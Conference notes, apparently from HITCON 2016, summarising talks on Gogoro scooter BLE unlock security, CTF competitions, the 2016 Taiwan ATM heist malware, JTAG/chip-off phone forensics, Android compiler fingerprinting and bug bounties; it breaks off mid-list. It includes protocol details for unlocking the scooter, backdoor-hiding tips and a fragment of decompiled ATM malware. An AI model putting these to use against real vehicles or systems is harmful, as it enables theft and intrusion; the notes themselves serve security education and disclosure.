&lt;li&gt;Key Fob Unlock (BLE)  &lt;ul&gt;
&lt;li&gt;Better than keeloq  &lt;/li&gt;
&lt;li&gt;類似 Challenge &amp;amp; Response 的過程  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App (Gateway)  &lt;ul&gt;
&lt;li&gt;交車設定 My Gogoro 帳號  &lt;/li&gt;
&lt;li&gt;App 登入下載 Scooter 資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App Pairing &amp;amp; Unlock  &lt;ul&gt;
&lt;li&gt;配對過程僅 ATT 讀寫資訊，沒有使用 BLE 原生的配對設定。  &lt;/li&gt;
&lt;li&gt;問題定義  &lt;ul&gt;
&lt;li&gt;BLE 未配對，無硬體識別元，如何設計認証機制？ =&amp;gt; App 和機車裏面要有同把 key，而這個 key 從 Server 來。（登入下載到 App 上）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE Gogoro Service  &lt;ul&gt;
&lt;li&gt;Service UDID 末 8 byte 為 Scooter MAC Address  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Protocol 分析  &lt;ul&gt;
&lt;li&gt;發現有大概二十幾組 Command  &lt;ul&gt;
&lt;li&gt;A 開頭為一般資訊查詢  &lt;/li&gt;
&lt;li&gt;B 開頭為 Challenge 相關指令  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 流程  &lt;ul&gt;
&lt;li&gt;Scooter 掃描附近 Peripheral 是否有 GATT Gogoro 服務。 UUID 351AAF0F-末 8 byte 同 Scooter MAC Address 才連上  &lt;/li&gt;
&lt;li&gt;Mobile App 讀取 Scooter 目前狀態，啟用解鎖按鈕。按下按鈕後送出 ECU_Cmd(0xB4) Value 上鎖 0x00, 解鎖 0x01  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;車鑰匙 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ECU_Response=SHA256(ECU_Challenge, Security_Key)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Insecure App Data Storage  &lt;ul&gt;
&lt;li&gt;Token, Certificate 應該放在加密儲存區  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 模擬程式  &lt;ul&gt;
&lt;li&gt;根據上述分析結果，撰寫可 Unlock 已知 Security_Key 的 Scooter 的 Android App。（只要 Security_Key leak 的話就可能會被 Hacker 控制）  &lt;/li&gt;
&lt;li&gt;因此得知：  &lt;ul&gt;
&lt;li&gt;攻擊者只要取得 Security_Key 就能解鎖 Gogoro  &lt;/li&gt;
&lt;li&gt;Security_Key 可被轉移到其他手機使用  &lt;/li&gt;
&lt;li&gt;Scooter 無法驗證 Mobile 裝置識別元  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Security_Key 可能 Leak 的途徑  &lt;ul&gt;
&lt;li&gt;車主在 Gogoro 官網的帳號密碼被破解  &lt;/li&gt;
&lt;li&gt;車主手機的備份檔流出  &lt;/li&gt;
&lt;li&gt;車主手機使用不安全的連線導致 Security_Key 流出  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro 分析結果  &lt;ul&gt;
&lt;li&gt;裝置識別元隱私保護 =&amp;gt; 提高驗證設計難度  &lt;/li&gt;
&lt;li&gt;Insecure App Data Storage 弱點  &lt;/li&gt;
&lt;li&gt;其他可能威脅  &lt;ul&gt;
&lt;li&gt;取 Security_Key API 沒有 SSL Cert Pining 可能被 MITM  &lt;/li&gt;
&lt;li&gt;Challenge-Response 可能被 Relay-Attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大體來說 Gogoro 系統設計是安全的  &lt;ul&gt;
&lt;li&gt;藍牙傳輸雖然沒有配對與加密，但是傳輸的是一次性的 Challenge/Response  &lt;/li&gt;
&lt;li&gt;在手機端，金鑰基本上是綁手機，除非手機有自己做破解，而且被安裝後門程式，不然不容易直接從手機取得 Security_Key  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;威脅情境  &lt;ul&gt;
&lt;li&gt;車主手機被植入木馬  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;弱點通報廠商  &lt;ul&gt;
&lt;li&gt;Gogoro 處理的態度非常積極  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 裝置認証設計的挑戰  &lt;ul&gt;
&lt;li&gt;無法讀取裝置識別元  &lt;ul&gt;
&lt;li&gt;IoT 裝置事先不認識手機  &lt;/li&gt;
&lt;li&gt;IoT 裝置事先  認識金鑰  &lt;/li&gt;
&lt;li&gt;藉由 Server 把金鑰給手機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;防止金鑰被複製  &lt;ul&gt;
&lt;li&gt;BLE 4.2 Secure Connections  &lt;/li&gt;
&lt;li&gt;金鑰+手機裝置識別元  &lt;/li&gt;
&lt;li&gt;金鑰 Secure Element 儲存  &lt;/li&gt;
&lt;li&gt;金鑰+ Server SMS OTP  &lt;ul&gt;
&lt;li&gt;綁門號，不綁定手機。  &lt;/li&gt;
&lt;li&gt;SMS 要錢，需要電信門號，IoT 裝置需跟 Server 同步。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;金鑰+ Dual Counter 強化認証  &lt;ul&gt;
&lt;li&gt;綁定手機，可察覺金鑰盜用。  &lt;/li&gt;
&lt;li&gt;未必能阻擋金鑰盜用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雙計數器強化認証  &lt;ul&gt;
&lt;li&gt;手機只存暫時性的 Key，如果被偷的話，可以 Revoke 掉。  &lt;/li&gt;
&lt;li&gt;真正的 Key 存在 Server  &lt;/li&gt;
&lt;li&gt;如果有其他裝置啟動自己的車子的話，計數器的數字會不 Match，可以察覺到有別人存取過自己的車子。  &lt;/li&gt;
&lt;li&gt;察覺到的話，可以把手機上的暫時性的 Key revoke 掉，換一把新的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;介紹 Bluetooth Low Energy 安全性分析流程  &lt;/li&gt;
&lt;li&gt;Smartphone 透過 BLE 控制 IoT 裝置，需要一套認証機制  &lt;/li&gt;
&lt;li&gt;BLE 4.0 配對有許多限制，故廠商選擇另外設計自己的配對機制。  &lt;/li&gt;
&lt;li&gt;消費者隱私重視下，硬體識別元受限且亂數化。  &lt;/li&gt;
&lt;li&gt;提供一種更好的認証機制：雙計數器強化認証  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未來展望  &lt;ul&gt;
&lt;li&gt;因為這台每天都要騎，所以不敢拆來研究 XDD  &lt;/li&gt;
&lt;li&gt;Key Fob 晶片演算法研究  &lt;/li&gt;
&lt;li&gt;Challenge nonce 亂數強度  &lt;/li&gt;
&lt;li&gt;是否可從 ECU 或其他管道取得 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;所以手機上那把 &lt;code&gt;Security_Key&lt;/code&gt; 被幹走的話，目前是無法換新的 &lt;code&gt;Security_Key&lt;/code&gt; 的？  &lt;ul&gt;
&lt;li&gt;對，目前是無法被更新的，至於要不要用新的機制，要問 Gogoro。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HMAC 還是需要一把 Key，但那把存在手機上，還是不能避免外洩囉？  &lt;ul&gt;
&lt;li&gt;對，這邊只是用個 counter 來察覺外洩而已，並沒有要保護那把 Key，因為手機只要有 root 的話，就有外洩的風險。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;Security_Key&lt;/code&gt; 不能更換的情況下，二手車是否有風險？  &lt;ul&gt;
&lt;li&gt;對，因為不能更換，等於原車主只要有心，還是可以保留 Security Key。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://thinkingiot.blogspot.tw/"&gt;Le IoT  想想物聯網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Bluetooth_low_energy"&gt;Bluetooth low energy - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/KeeLoq"&gt;KeeLoq - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Introduction to CTF - BambooFox&lt;/h2&gt;
&lt;h3&gt;Speaker: C.K Chen 陳仲寬&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Why attend CTF challenges?  &lt;ul&gt;
&lt;li&gt;The other way for security training  &lt;ul&gt;
&lt;li&gt;CTF as the training for offensive security  &lt;/li&gt;
&lt;li&gt;Emulate real world problems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice your hacking skill  &lt;/li&gt;
&lt;li&gt;Compete with top hackers in the world.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF  &lt;ul&gt;
&lt;li&gt;The competition to steal data, a.k.a flag, from other computers  &lt;ul&gt;
&lt;li&gt;EX. Stea admin password from a web server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Most pobleams are related to real world  &lt;/li&gt;
&lt;li&gt;Good practices for students even experts.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of CTF  &lt;ul&gt;
&lt;li&gt;Starting from DEFCON 4 in 1996  &lt;ul&gt;
&lt;li&gt;Format is a mystery  &lt;/li&gt;
&lt;li&gt;Held every year since 1996  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Regions  &lt;ul&gt;
&lt;li&gt;Japan  &lt;ul&gt;
&lt;li&gt;SECCON, TMCTF, MMACTF  &lt;/li&gt;
&lt;li&gt;特別愛出 QR code 的題目  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;South Korea  &lt;ul&gt;
&lt;li&gt;CodeGate, SECUINSIDE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;China  &lt;ul&gt;
&lt;li&gt;XCTF（聯賽）, BCTF(北京清華), 0CTF（上海交大）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Russia  &lt;ul&gt;
&lt;li&gt;RuCTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;France  &lt;ul&gt;
&lt;li&gt;Nuit du Hack CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Malaysia  &lt;ul&gt;
&lt;li&gt;HITB CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Colombia  &lt;ul&gt;
&lt;li&gt;Backdoor CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTFTime  &lt;/li&gt;
&lt;li&gt;Famous CTF Teams  &lt;ul&gt;
&lt;li&gt;PPP (US, CMU)  &lt;/li&gt;
&lt;li&gt;HITCON (TW)  &lt;/li&gt;
&lt;li&gt;217 (TW, NTU)  &lt;/li&gt;
&lt;li&gt;0ops (China, Shanghai Jiao Tong University)  &lt;/li&gt;
&lt;li&gt;Blue-Lotus (China, Tsinghua University)  &lt;/li&gt;
&lt;li&gt;Dragon Sector (Poland)  &lt;/li&gt;
&lt;li&gt;Gallopsled (Danmark)  &lt;/li&gt;
&lt;li&gt;Shellphish (US, UCSB)  &lt;/li&gt;
&lt;li&gt;DEFKOR (South Korea)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF Types  &lt;ul&gt;
&lt;li&gt;JeoPardy 解題型  &lt;ul&gt;
&lt;li&gt;About 90% CTF are held in this type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attack &amp;amp; Defense  &lt;ul&gt;
&lt;li&gt;Need good support of networking environment  &lt;/li&gt;
&lt;li&gt;Skill needed  &lt;ul&gt;
&lt;li&gt;Vul discovery and patching  &lt;/li&gt;
&lt;li&gt;Network flow analysis  &lt;/li&gt;
&lt;li&gt;System Administration  &lt;/li&gt;
&lt;li&gt;Backdoor  &lt;ul&gt;
&lt;li&gt;把 process name 改成跟服務的名稱一樣，讓對方不知道要不要砍。  &lt;/li&gt;
&lt;li&gt;用提權的方式放入別人沒辦法砍掉的後門  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online: iCTF, RuCTF  &lt;/li&gt;
&lt;li&gt;Local: DEFCON Final , HITOCN Final, SECCON Final, XCTF Final, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;King of Hill  &lt;ul&gt;
&lt;li&gt;Local: HoneyMe  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Which CTF to Play?  &lt;ul&gt;
&lt;li&gt;For Beginners  &lt;ul&gt;
&lt;li&gt;Backdoor, CSAW Qualificaiton, ASIS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced  &lt;ul&gt;
&lt;li&gt;DEFCON  &lt;/li&gt;
&lt;li&gt;PladiCTF (hold by PPP)  &lt;/li&gt;
&lt;li&gt;CodeGate (South Korea)  &lt;/li&gt;
&lt;li&gt;SECCON (Japan)  &lt;/li&gt;
&lt;li&gt;PHD Quals  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Expreience Sharing  &lt;ul&gt;
&lt;li&gt;Focus!  &lt;ul&gt;
&lt;li&gt;When you start to CTF, it is best to focus on one type of problem.&lt;br /&gt;
    E.g. Pwn, Reverse, Web  &lt;/li&gt;
&lt;li&gt;只要先讓自己專注於解某一類的題目，壓力比較小。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Following New Techniques  &lt;/li&gt;
&lt;li&gt;Customize Your CTF Toolset  &lt;ul&gt;
&lt;li&gt;Prepare Your own environment  &lt;/li&gt;
&lt;li&gt;E.g., pwntools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice, Practice and Practice  &lt;/li&gt;
&lt;li&gt;Enjoy the Game  &lt;ul&gt;
&lt;li&gt;不要有太大的壓力覺得自己一定要拿多少分數，應該要享受題目，讓自己儘可能從中學到東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;神祕議程：黑客搶銀行&lt;/h2&gt;
&lt;h3&gt;Speaker: cclien&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;20160716 上演 ATM Pwn2Own  （第一銀行提款機被搶 8000 萬新台幣）  &lt;/li&gt;
&lt;li&gt;2010 年的 Blackhat 就有 Live Demo 過 ATM 吐鈔票  &lt;/li&gt;
&lt;li&gt;國外有 ATM 被攻擊的案例嗎  &lt;ul&gt;
&lt;li&gt;Backdoor.Tyupkin - 光碟片吐鈔  &lt;/li&gt;
&lt;li&gt;Carbanak APT 內網策動吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor KDIAG32 維護程式吐鈔  &lt;/li&gt;
&lt;li&gt;俄羅斯和烏克蘭那邊很多提款機的維護人員會跳去作黑產賺外快 （？）  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bankomatchik.ru/"&gt;bankomatchik&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CDM300.exe&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;CSCWCING.EXE&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;這個論壇是和 ATM 有關的工程師在討論的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安德魯這個名字在俄羅斯是菜市場名  &lt;/li&gt;
&lt;li&gt;History  &lt;ul&gt;
&lt;li&gt;2013  &lt;ul&gt;
&lt;li&gt;Skimer Trojan  &lt;/li&gt;
&lt;li&gt;Plotus Trojan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2014  &lt;ul&gt;
&lt;li&gt;Tyupkin Trojan (Russia)  &lt;/li&gt;
&lt;li&gt;Anunak 1.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor Reg Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;Carbanak 2.0 犯罪集團 (Global)  &lt;/li&gt;
&lt;li&gt;GreenDispenser Trojan (Mexico)  &lt;/li&gt;
&lt;li&gt;SUCEFUL Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;GCMAN Trojan  &lt;/li&gt;
&lt;li&gt;METEL Trojan  &lt;/li&gt;
&lt;li&gt;Anunak 2.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor CNG Trojan (Taiwan)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DMS 派送機制  &lt;/li&gt;
&lt;li&gt;網路架構圖中，Gateway 為什麼是網路卡？不是 Firewall？猜測是 CISCO 的設備，例如 PIX Firewall  &lt;/li&gt;
&lt;li&gt;吐鈔時間不是寫死的，是用電話與遠端的駭客聯絡，透過遠端協助 telnet 進去 ATM 讓它吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor 的硬體網路上都買得到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同層面的 ATM 後門攻擊方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                          應用軟體層  
                              ||  
                    WOSA/XFS, CEN/XFS 3.0  
                              ||  
OKI SP(硬體) NCR SP   Wincor SP   Hitachi SP   Diebold SP  
                    作業系統 Windows XP/7  
OKI ATM      NCR ATM  Wincor ATM  Hitachi ATM  Diebold ATM  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ATM 吐鈔程式限定 2016 年 7 月  &lt;ul&gt;
&lt;li&gt;可能因為是集團長期佈署及規劃的活動。  &lt;/li&gt;
&lt;li&gt;可能是買斷的軟體，設定時間後出貨，所以可以賣給其他人，這只是其中一個買家。  &lt;/li&gt;
&lt;li&gt;從程式碼看來，英文用的很正確，程式應該不是俄羅斯人所撰寫。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{  
    v9 = v20;  
    *(_DWORD *)&amp;amp;SystemTime.wYear = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wDayOfWeek = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wHour = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wSecond = 0;  
    GetSystemTime(&amp;amp;SystemTime);  
    if ( SystemTime.wYear != 2016 || SystemTime.wMonth != 7 || )  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;新聞一直說內鬼，到底有沒有內鬼？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不太可能是內鬼所為。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;這次破案的關鍵可能在哪？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;台灣到處都有攝影機的畫面可以調閱。  &lt;/li&gt;
&lt;li&gt;台灣的外國人太少，會特別被注意。尤其到宜蘭吃飯還會被餐廳老闆娘要求合照。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台灣是鬼島，封鎖機場跟地下匯兌的話，人跟錢都出不去。  &lt;/li&gt;
&lt;li&gt;第一銀行決定把同機型(Wincor PC 1500)通通換掉，有沒有用？  &lt;ul&gt;
&lt;li&gt;典型的「頭痛醫頭，腳痛醫腳。」  &lt;/li&gt;
&lt;li&gt;每一型的 ATM 都有人在討論漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在場的俄羅斯 Native Speaker 表示：「聽不太懂台灣那位幫安得魯翻譯俄文的女孩講的俄文」  &lt;/li&gt;
&lt;li&gt;最冤枉的就是 ATM，因為不是 ATM 本身的漏洞，是派送機制的管理跟網路管理上的漏洞。  &lt;/li&gt;
&lt;li&gt;真正幕後的 Hacker 並沒有被抓到，抓到的只是車手，只要換一批車手就可以繼續幹一樣的事情，如果能夠透過後續的調查，還原入侵的手法，藉此去防範，才能有效解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Advanced Mobile Device Analysis using JTAG and Chip-Off&lt;/h2&gt;
&lt;h3&gt;Speaker: Kelvin Wong&lt;/h3&gt;
&lt;h4&gt;JTAG&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is JTAG  &lt;ul&gt;
&lt;li&gt;Joint Test Action Group  &lt;/li&gt;
&lt;li&gt;Test Access Ports (TAPs) to collect raw data from a memory chips  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Not chip-off and ISP  &lt;ul&gt;
&lt;li&gt;Chip-Off: Remove the chip from the device  &lt;/li&gt;
&lt;li&gt;In-Circular System Programming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extreme physical data acquisition  &lt;/li&gt;
&lt;li&gt;Advanced technique  &lt;/li&gt;
&lt;li&gt;Soldering and De-soldering （焊接）  &lt;/li&gt;
&lt;li&gt;JTAG Box  &lt;ul&gt;
&lt;li&gt;Riff BOX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Finder  &lt;/li&gt;
&lt;li&gt;Mounting Frame &amp;amp; Arms  &lt;/li&gt;
&lt;li&gt;TAP  &lt;ul&gt;
&lt;li&gt;TCK: test clock  &lt;/li&gt;
&lt;li&gt;TMS: test mode state  &lt;/li&gt;
&lt;li&gt;TDI: test data in  &lt;/li&gt;
&lt;li&gt;TDO: test data out  &lt;/li&gt;
&lt;li&gt;TRST: test reset  &lt;/li&gt;
&lt;li&gt;NRST: normal reset  &lt;/li&gt;
&lt;li&gt;RTCK: return clock  &lt;/li&gt;
&lt;li&gt;GND: ground  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Molex and Jig  &lt;/li&gt;
&lt;li&gt;Demonstration using Riff Box  &lt;ul&gt;
&lt;li&gt;HTC EVO 3G  &lt;/li&gt;
&lt;li&gt;Android OS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decoding the Lock Pattern  &lt;ul&gt;
&lt;li&gt;gesture.key  &lt;/li&gt;
&lt;li&gt;20 bytes in length  &lt;/li&gt;
&lt;li&gt;open source tools: Android Pattern Lock Cracker  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Chip-Off&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is Chip-Off?  &lt;ul&gt;
&lt;li&gt;eMMC cihp  &lt;/li&gt;
&lt;li&gt;NAND Flash  &lt;/li&gt;
&lt;li&gt;Disassemble &amp;amp; Re-balling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eMMC programmer &amp;amp; Adapters  &lt;/li&gt;
&lt;li&gt;eMMC Box  &lt;/li&gt;
&lt;li&gt;EPR BOx &amp;amp; BGA 169e adaptor  &lt;/li&gt;
&lt;li&gt;UFED Physical Analyzer  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Android Compiler Fingerprinting&lt;/h2&gt;
&lt;h3&gt;Speaker: Caleb Fenton, Tim Strazzere&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Android Application Packaging  &lt;ul&gt;
&lt;li&gt;apktool  &lt;/li&gt;
&lt;li&gt;axmlprinter2  &lt;/li&gt;
&lt;li&gt;jeb  &lt;/li&gt;
&lt;li&gt;Reverse with  &lt;ul&gt;
&lt;li&gt;smali / apktool  &lt;/li&gt;
&lt;li&gt;IDA Pro  &lt;/li&gt;
&lt;li&gt;jeb / jeb2  &lt;/li&gt;
&lt;li&gt;androguard  &lt;/li&gt;
&lt;li&gt;enjarify  &lt;/li&gt;
&lt;li&gt;dex2jar + jad/jd  &lt;/li&gt;
&lt;li&gt;jadx  &lt;/li&gt;
&lt;li&gt;radare  &lt;/li&gt;
&lt;li&gt;010Editoer Templates  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AXML Files  &lt;/li&gt;
&lt;li&gt;DEX Files  &lt;ul&gt;
&lt;li&gt;Dex format is ... flexible  &lt;/li&gt;
&lt;li&gt;Only a few different compilers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Investigation  &lt;ul&gt;
&lt;li&gt;Built logs of DEX files with different tools  &lt;/li&gt;
&lt;li&gt;Compared files with 010Editor  &lt;/li&gt;
&lt;li&gt;Found some differneces but wanted to know all of them  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Characteristics  &lt;ul&gt;
&lt;li&gt;These may be abnormal  &lt;ul&gt;
&lt;li&gt;Class interfaces  &lt;/li&gt;
&lt;li&gt;Class paths  &lt;/li&gt;
&lt;li&gt;Endian tag  &lt;/li&gt;
&lt;li&gt;Header size  &lt;/li&gt;
&lt;li&gt;Link section  &lt;/li&gt;
&lt;li&gt;String sorting  &lt;/li&gt;
&lt;li&gt;Map type order  &lt;/li&gt;
&lt;li&gt;Section contiguity  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/07/23 Sat)&lt;/h1&gt;
&lt;h2&gt;Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞&lt;/h2&gt;
&lt;h3&gt;Speaker: Orange Tsai, DEVCORE Consultant&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Slides: &lt;a href="http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html"&gt;http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What is Bug Bounty Program?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在官方所提供的規則及範圍下，讓獨立的研究人員可以自由尋找系統漏洞，並提供對等的獎勵。  &lt;ul&gt;
&lt;li&gt;小禮物  &lt;/li&gt;
&lt;li&gt;獎金  &lt;/li&gt;
&lt;li&gt;名譽 (Hall of Fame)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 的好處？  &lt;ul&gt;
&lt;li&gt;防止漏洞流入地下市場  &lt;/li&gt;
&lt;li&gt;企業架構大難顧及網路邊界時，Bug Bounty 可以邀請更多人來測試產品的漏洞  &lt;/li&gt;
&lt;li&gt;企業對外形象宣傳：告訴社會大眾重視資安，吸引資安高手  &lt;/li&gt;
&lt;li&gt;改善社會不良風氣：告訴駭客們有更簡單的方式可以做好事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;哪些企業已經有 Bug Bounty?  &lt;ul&gt;
&lt;li&gt;1995: Netscape  &lt;/li&gt;
&lt;li&gt;2010: Google  &lt;/li&gt;
&lt;li&gt;2011: Facebook  &lt;/li&gt;
&lt;li&gt;2013: Microsoft, Yahoo  &lt;/li&gt;
&lt;li&gt;2014: Twitter  &lt;/li&gt;
&lt;li&gt;2015: Line  &lt;/li&gt;
&lt;li&gt;2016: Uber, Spotify, Uber, Pornhub (今年 5 月開始)  &lt;/li&gt;
